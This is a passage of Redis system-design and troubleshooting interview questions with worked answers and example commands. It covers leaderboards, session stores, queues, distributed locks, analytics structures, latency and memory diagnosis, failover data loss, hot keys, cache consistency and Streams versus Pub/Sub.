### Q3. Design a leaderboard.

A **sorted set (ZSET)** is purpose-built for this — score-ordered, O(log N) updates, O(log N + M) range reads:

```bash
ZADD leaderboard 1500 alice
ZADD leaderboard 1200 bob
ZINCRBY leaderboard 50 alice        # real-time score bump

ZREVRANGE leaderboard 0 9 WITHSCORES   # top 10
ZREVRANK leaderboard alice             # alice's rank (0-based)
ZSCORE leaderboard alice               # alice's score
ZREVRANGE leaderboard <rank-2> <rank+2> # players around a user
```

Why ZSET: top-N, a specific player's rank, and score-neighbors are all built-in and cheap; updates are real-time. For scale: shard by league/region into separate ZSETs, or bucket by time (daily/weekly keys with TTLs) for periodic boards. For huge boards, `ZREVRANGEBYSCORE` with `LIMIT` paginates. The whole feature is essentially one data structure — that's the point of the question: recognize that "leaderboard" *is* "ZSET."

### Q4. Design a session store.

Store each session as a **hash** (fields for user id, roles, csrf token...) or a serialized string, keyed by session id, with a **sliding TTL**:

```bash
HSET session:abc123 uid 42 role admin
EXPIRE session:abc123 1800          # 30-min idle timeout
# on each request, refresh the TTL:
EXPIRE session:abc123 1800          # sliding window
HGETALL session:abc123
DEL session:abc123                  # logout
```

Why Redis fits: sessions are ephemeral, hot, and need sub-millisecond lookup on every request — exactly Redis's sweet spot. The **sliding TTL** implements idle timeout (refresh on activity; let it expire on inactivity). Because it's a central store shared by all app servers, sessions work seamlessly behind a load balancer with no sticky-session hack — any server can serve any user. A hash lets you read/update individual fields without deserializing the whole session. TTL handles cleanup automatically; no cron job needed. If sessions must survive a Redis restart, enable AOF or use a durable option — but usually a re-login on the rare failure is acceptable.

### Q5. Design a job/task queue, and when do you outgrow it?

Progression from simple to robust:

**Basic** — a list as a FIFO queue with a blocking pop:

```bash
LPUSH jobs:queue <job>          # producer
BRPOP jobs:queue 5              # consumer blocks up to 5s
```

Simple, but if the worker crashes after `BRPOP` and before finishing, the job is **lost**.

**Reliable queue** — `LMOVE` (or the older `RPOPLPUSH`) atomically moves the job to a per-worker processing list:

```bash
LMOVE jobs:queue jobs:processing:w1 RIGHT LEFT
# ... do the work ...
LREM jobs:processing:w1 1 <job>     # ack: remove on success
```

A crash leaves the job in the processing list; a reaper requeues stale entries. This gives at-least-once delivery.

**Streams with consumer groups** — the modern answer for anything serious:

```bash
XADD jobs * task email uid 42
XREADGROUP GROUP workers w1 COUNT 1 BLOCK 5000 STREAMS jobs >
XACK jobs workers <id>          # explicit ack
# XPENDING / XCLAIM to recover un-acked messages from dead workers
```

Streams give durable, replayable delivery, consumer groups (load-balanced), explicit acks, and dead-worker recovery — a proper reliable queue.

**When to outgrow Redis:** if you need high throughput with long retention, complex routing, or exactly-once semantics across a big fleet, move to a real broker (Kafka, RabbitMQ, SQS). Redis queues are excellent up to moderate scale; they're not a company-wide message backbone.

### Q6. Design a distributed lock, correctly.

Basic acquire with a **random token** and a TTL, atomically:

```bash
SET lock:resource <random_token> NX PX 30000
# NX = only if not exists; PX = auto-expire in 30s so a dead holder can't deadlock
```

**Release must be a compare-and-delete in Lua** — never a bare `DEL`, or you'll delete someone else's lock after yours expired:

```lua
if redis.call('GET', KEYS[1]) == ARGV[1] then
  return redis.call('DEL', KEYS[1])
else
  return 0
end
```

```bash
EVAL <above> 1 lock:resource <random_token>
```

The caveats that make this a senior question:

- **TTL vs work duration** — if the job runs longer than the TTL, the lock expires mid-work and a second worker acquires it → two workers run. Use a **watchdog** that extends the TTL while working, or size the TTL safely.
- **Redlock** (locking across N independent masters for HA) exists, but Kleppmann's well-known critique shows it's still **not safe for correctness-critical mutual exclusion** — GC pauses/clock skew can let a stale holder act.
- The robust fix for correctness is **fencing tokens**: the lock hands out a monotonically increasing number, and the protected resource rejects any write with a stale token.

So: `SET NX PX` + Lua release is fine for *efficiency* locks (avoid duplicate work); for *correctness* (must never double-run), you need fencing or a real coordination service.

### Q7. Design real-time analytics / unique counts.

Match the metric to the structure:

- **Simple counts** (page views, events) — `INCR`/`INCRBY`, optionally per-time-bucket keys with TTLs:

```bash
INCR views:page:42:20260701
```

- **Unique counts** (unique visitors) at scale — **HyperLogLog**: approximate cardinality (~0.81% error) in a fixed ~12KB regardless of how many items:

```bash
PFADD visitors:20260701 user:1 user:2 user:1
PFCOUNT visitors:20260701          # ~unique count
PFMERGE visitors:week visitors:day1 visitors:day2   # union without double-count
```

- **Per-user boolean events** (did user N do X?) — **bitmaps**: one bit per user id, `SETBIT`/`BITCOUNT` for "how many users were active today," `BITOP` for retention (active both days):

```bash
SETBIT active:20260701 42 1
BITCOUNT active:20260701
BITOP AND active:both active:20260701 active:20260702
```

The reasoning: exact per-item storage would explode memory at scale; HLL and bitmaps give correct-enough answers in bounded space. HLL when you only need the *count*; bitmaps when user ids are dense integers and you need set operations across days.

### Q8. Design an autocomplete / nearby-search feature.

**Autocomplete** — two common approaches:

- A **sorted set with lexicographic ranges**: add prefixes/terms with equal scores and use `ZRANGEBYLEX` to fetch completions for a prefix. Cheap and built-in.
- **RediSearch** (module) for real prefix/fuzzy/weighted suggestions (`FT.SUGGET`) — the production-grade answer when you need ranking and typo-tolerance.

```bash
ZRANGEBYLEX terms "[redis" "[redis\xff"   # completions starting with "redis"
```

**Nearby / geo-search** — Redis has native geo commands built on ZSETs (geohash-encoded scores):

```bash
GEOADD places 13.361 38.115 "cafe:1"
GEOSEARCH places FROMLONLAT 13.36 38.11 BYRADIUS 5 km ASC COUNT 10
```

`GEOSEARCH` returns members within a radius/box, sorted by distance — exactly what "find restaurants near me" needs, in O(N+log M). The takeaway: Redis already has geo and lex-range primitives, so both features are a data-structure choice, not a build-from-scratch — and if you need richer text/vector matching, that's RediSearch.

### Q9. "Someone ran `KEYS *` in production and everything froze." What happened?

**The anti-pattern: a blocking O(N) command on the single-threaded server.** `KEYS *` scans the *entire* keyspace in one shot, and because Redis executes one command at a time on one thread, every other client is blocked for the whole scan. On a keyspace of millions, that's seconds of total stall — a self-inflicted outage.

The fix — **`SCAN`**, a cursor-based iterator that returns keys in small batches without blocking:

```bash
SCAN 0 MATCH user:* COUNT 100
# -> returns a cursor + a batch; call again with the returned cursor until it's 0
```

`SCAN` (and its friends `HSCAN`/`SSCAN`/`ZSCAN`) yields between batches so other commands interleave. It's eventually-consistent (keys added/removed during iteration may or may not appear) but that's the correct tradeoff for a production keyspace walk. Prevention: `rename-command KEYS ""` or deny it via ACL so nobody can run it against prod. Same lesson applies to any O(N)-on-a-huge-key command (`SMEMBERS`, `HGETALL`, `LRANGE 0 -1` on giant collections) — use the `SCAN` variants or fetch ranges.

### Q10. "Our p99 latency suddenly spiked." How do you diagnose it?

On a single-threaded server, a p99 spike almost always means *something briefly blocked the event loop*. Triage in order:

```bash
LATENCY DOCTOR         # names the likely cause
LATENCY LATEST
SLOWLOG GET 10         # any slow O(N) command?
INFO memory            # mem_fragmentation_ratio < 1 => swapping!
redis-cli --bigkeys    # outsized keys behind O(N) ops
```

The usual suspects:

- **Fork pause** — `BGSAVE`/`BGREWRITEAOF`/replica sync `fork()`s; on a big dataset the COW setup stalls the thread. Move snapshots to a replica, tune save rules, disable **THP**.
- **Swap** — Redis memory swapped to disk; every access hits disk. Ensure it never swaps.
- **Big-key O(N)** — an `HGETALL`/`SMEMBERS`/`SORT` on a large key found via `SLOWLOG`/`--bigkeys`; split the key or use range/`SCAN` variants.
- **Giant `DEL`** — freeing a huge key blocks; use **`UNLINK`** for async free.
- **Hot key** — one key taking disproportionate traffic; find via `--hotkeys`, mitigate with client-side caching or key-splitting.

Name the mechanism, then the fix. "It's the network" is the junior answer; check `SLOWLOG` and `LATENCY` first.

### Q11. "Redis OOM'd / is rejecting writes / is evicting like crazy." What's going on?

Three related failure modes, all memory pressure:

- **Rejecting writes** (`OOM command not allowed`) — `maxmemory` is hit and the policy is **`noeviction`**. Correct for a datastore (reject rather than drop data), a surprise if you thought it was a cache.
- **Evicting heavily** (`evicted_keys` climbing, hit rate dropping) — working set exceeds `maxmemory`, so Redis is thrashing, evicting keys you're about to need.
- **Was OOM-killed by the OS** — no `maxmemory` set, so the process grew until the kernel killed it.

Diagnose and fix:

```bash
CONFIG GET maxmemory
CONFIG GET maxmemory-policy
redis-cli --bigkeys           # is one giant key eating memory?
INFO memory                    # mem_fragmentation_ratio for fragmentation
```

- Set a `maxmemory` below box RAM (leave headroom for fork COW).
- Choose the policy deliberately: `allkeys-lru`/`lfu` for a cache, `noeviction` only for a datastore you monitor closely.
- **Add TTLs** — the root cause is often unbounded keys with no expiry; a cache with no TTLs will fill forever.
- **Split big keys** — one huge hash/set both wastes memory and causes O(N) latency.

### Q12. "Our cache hit rate is low." Why, and how do you fix it?

Low hit rate = you're paying for a cache that isn't shielding the DB. Root causes:

- **TTLs too short** — keys expire before they're reused. Lengthen TTLs to match reuse patterns; check `expired_keys`.
- **Caching the wrong keys** — you cache things rarely re-read. Cache by actual access frequency, not by what's easy.
- **Cold cache** — after a restart/deploy/`FLUSHALL` the cache is empty and must warm up. Consider warming critical keys on startup.
- **Eviction thrashing** — working set > `maxmemory`, so Redis evicts keys you immediately need again. Check `evicted_keys`; add memory or shrink what you cache.
- **Low-locality workload** — if access is genuinely uniform-random over a huge space, no cache helps much; that's a design mismatch, not a tuning problem.

```bash
INFO stats     # keyspace_hits / misses -> hit rate; evicted_keys; expired_keys
```

The diagnostic combo: low hit rate + high `evicted_keys` = thrashing (memory); low hit rate + high `expired_keys` = TTLs too aggressive; low hit rate + neither = wrong keys or cold cache.

### Q13. "We lost data after a failover." Why did that happen?

Because Redis replication is **asynchronous**. The primary acks a write to the client *before* it has reached the replicas. If the primary crashes in that window and a replica is promoted, the un-replicated writes are gone. This is a fundamental tradeoff, not a bug — sync replication would add latency to every write.

Understand and mitigate:

- **`WAIT numreplicas timeout`** — block until N replicas ack the preceding writes, shrinking (not eliminating) the loss window for critical writes:

```bash
SET order:42 confirmed
WAIT 1 100     # wait up to 100ms for 1 replica to ack
```

- **`min-replicas-to-write` / `min-replicas-max-lag`** — refuse writes unless enough replicas are sufficiently caught up, trading availability for durability.
- **AOF `appendfsync always`** — durable to local disk per write, but doesn't help if the whole node dies before replication.
- **MemoryDB** — if you genuinely need zero-loss failover, use a Redis-compatible store with a durable multi-AZ log; vanilla Redis isn't built for it.

The senior point: name the async-replication window explicitly and pick the durability/latency tradeoff deliberately — don't pretend Redis failover is lossless.

### Q14. "A hot key is bottlenecking one node even in Cluster." What do you do?

Cluster shards by **key** (CRC16 → hash slot → node), so all traffic for a *single* hot key lands on *one* node — sharding doesn't help a single hot key. That node's single thread saturates while others idle.

Fixes:

- **Client-side caching (RESP3 tracking)** — clients cache the hot key locally and the server pushes invalidations; most reads never reach Redis. Best fix for a hot, rarely-changing key.
- **Local in-process cache** with a short TTL in the app tier — same idea, cruder.
- **Split the key** — if it's a counter, shard it into N sub-keys (`counter:42:{0..9}`), write to a random shard, sum on read; spreads writes across slots/nodes.
- **Replicas for reads** — route reads of the hot key to replicas (`READONLY`) to spread read load, accepting slight staleness.

```bash
redis-cli --hotkeys        # identify the hot key (needs LFU)
```

Name it: sharding distributes *keys*, not *load on one key*; you fight a hot key with caching or key-splitting, not more shards.

### Q15. "Our cache and database are inconsistent." How do you handle it?

Cache invalidation is famously hard; the inconsistency comes from a race between updating the DB and updating/invalidating the cache. Options, with tradeoffs:

- **Cache-aside + delete-on-write** (most common): write the DB, then `DEL` the cache key so the next read repopulates. Simpler and safer than trying to *update* the cache (which can write a stale value if two writers interleave). Still has a small race window; short TTLs bound the staleness.
- **Write-through** — write cache and DB together on every write; keeps them in sync at the cost of write latency and caching data that may never be read.
- **Write-behind** — write cache, async-flush to DB; fast but risks loss and complexity.
- **TTL as a backstop** — even with invalidation, a TTL guarantees staleness self-heals within a bounded time.
- **Order matters** — update DB *then* invalidate cache; invalidating first lets a concurrent read repopulate stale data before the DB commits.

For strict consistency, patterns like delete-then-write with a short TTL, or CDC-driven invalidation (the DB's change stream invalidates the cache), reduce the window. The honest answer: you can't make cache-aside perfectly consistent — you bound the staleness and pick the pattern that fits your tolerance.

### Q16. "Our distributed lock let two workers run simultaneously." What went wrong?

Almost always one of these:

- **The lock expired before the work finished.** TTL was 30s, the job took 45s; at 30s the lock auto-expired, a second worker acquired it, and now both run. Fix: a **watchdog** that periodically extends the TTL while work continues, or a TTL safely longer than worst-case work time.
- **Unsafe release.** Worker A's lock expired, worker B acquired it, then A finished and ran a bare `DEL lock` — deleting *B's* lock. Fix: release with the **Lua compare-and-delete** using a per-holder random token (only delete if the value is still mine).
- **No correctness guarantee at all.** Even with the above, `SET NX` locks aren't safe for correctness-critical mutual exclusion (GC pauses, clock skew, the Redlock critique). Fix: **fencing tokens** — the lock issues a monotonically increasing number, and the protected resource rejects writes carrying a stale token, so a delayed old holder can't corrupt state.

```bash
SET lock:job <token> NX PX 30000
# release: Lua GET==token then DEL   (never bare DEL)
```

The framing: distinguish an *efficiency* lock (avoid duplicate work; `SET NX PX` + Lua release is fine) from a *correctness* lock (must never double-run; needs fencing or a real consensus system like ZooKeeper/etcd).

### Q17. "We used Pub/Sub for critical events and lost messages." What's the fix?

**The anti-pattern: treating Pub/Sub as a durable message queue.** Redis Pub/Sub is **fire-and-forget, at-most-once** — messages are pushed to *currently connected* subscribers and then discarded. A subscriber that's down, slow, restarting, or not yet connected simply misses them; there's no persistence, no replay, no ack. For "critical events you can't lose," that's disqualifying.

The fix — **Redis Streams**, a durable append-only log with consumer groups:

```bash
XADD events * type order_paid id 42
XREADGROUP GROUP processors c1 COUNT 10 BLOCK 5000 STREAMS events >
XACK events processors <id>       # explicit acknowledgment
XPENDING events processors        # un-acked (in-flight) messages
XCLAIM events processors c2 60000 <id>   # reassign a dead consumer's message
```

Streams persist messages (subject to `MAXLEN`/retention), support **consumer groups** (load-balanced, each message to one consumer in the group), **explicit acks** (un-acked messages stay pending and can be reclaimed after a crash), and **replay** from any id. That's at-least-once delivery with crash recovery — everything Pub/Sub lacks. Use Pub/Sub only for ephemeral, lossy fan-out (live presence, cache-invalidation hints where a miss is tolerable). For anything you must not drop, use Streams — or a real broker like Kafka if you need bigger scale, longer retention, or richer routing.
